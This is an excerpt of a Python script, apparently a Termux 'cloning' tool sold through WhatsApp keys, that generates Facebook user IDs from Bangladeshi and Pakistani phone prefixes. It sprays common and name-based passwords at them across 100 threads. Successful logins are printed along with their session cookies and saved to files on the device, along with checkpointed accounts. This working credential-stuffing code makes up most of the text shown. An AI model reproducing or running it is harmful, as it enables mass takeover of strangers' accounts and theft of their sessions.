...
ha = current.day
today = date.today()
#os.system('xdg-open https://youtube.com/@ROSIDafridi')
...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  Md Abdul Rosid 
\x1b[1;92m[+] ON FACEBOK   :  Md Abdul Rosid 
\x1b[1;93m[+] ON GITHUB    :  Rosid456
...
def ROSID():
    os.system('clear')
    os.system('xdg-openhttps://www.youtube.com/@md.babluhossin3884')
    ROSID_Hasan(logo)
...
def action():
    global cpb
    global oks
    os.system('xdg-open https://www.youtube.com/@md.babluhossin3884')
    shuvo = input('\nINPUT===>   ')
    if shuvo == '':
        print()
        action()
...
def ROSID_email():
    ...
    os.system("clear")
    ROSID_Hasan(logo)
    ROSID_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    ROSID_Hasan(" -----------------------------------------------------------------------------------")
    rk1 = '.'
    rk2 = '1'
    rk3 = '0'
    ...
    os.system('clear')
    ROSID_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mROSID, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    ROSID_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mROSID, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    ROSID_Hasan(logo)
    ...
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        ROSID_Hasan('\033[1;97m====================================================')
        ROSID_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        ROSID_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        ROSID_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        ROSID_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        ROSID_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        ROSID_Hasan('\033[1;97m====================================================')
        for love in user:
            ROSIDuser=fastname+code+lasttname+love
...
def ROSID_bd():
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        ROSID_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        ROSID_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        ROSID_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        ROSID_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        ROSID_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        ROSID_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
            uid = code+love
            for ROSID in HamiiID:
                pwx.append(ROSID)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------")
...
def ROSID_pk():
    ...
    os.system("clear")
    ROSID_Hasan(logo)
    ROSID_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    ROSID_Hasan(" ----------------------------------------------------------------------------------------------------")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ROSID-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/ROSID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[ROSID-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/ROSID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ROSID{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def reg():
    ...
    r = requests.get('https://github.com/Rosid456/game/blob/main/Approval.txt').text
    if to in r:
        os.system('clear')
        ...
        os.system('am start https://wa.me/+8801936706784?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ROSID%20Paid%20Tools.%20My%20Key:%20'+id+ROSID)
        reg()
...
def reg2():
    ...
    print (' Your id: ' + id+ROSID)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801936706784?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ROSID=MEX%20Paid%20Tools.%20My%20Key:%20'+id+ROSID)
